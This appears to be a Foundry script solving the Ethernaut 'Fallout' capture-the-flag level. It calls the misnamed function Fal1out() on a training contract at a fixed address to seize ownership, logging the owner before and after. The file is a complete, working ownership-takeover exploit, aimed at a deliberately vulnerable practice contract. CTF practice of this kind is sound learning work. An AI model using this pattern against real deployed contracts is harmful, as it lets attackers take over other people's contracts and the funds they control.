// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level2FallbackSolution is Script {
    Fallout public instance = Fallout(0x685af93148D9589b74C0dB4335Ec9C53dEb82878);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("owner before: ", instance.owner());
        instance.Fal1out();
        console.log("owner after: ", instance.owner());

        vm.stopBroadcast();
    }
}
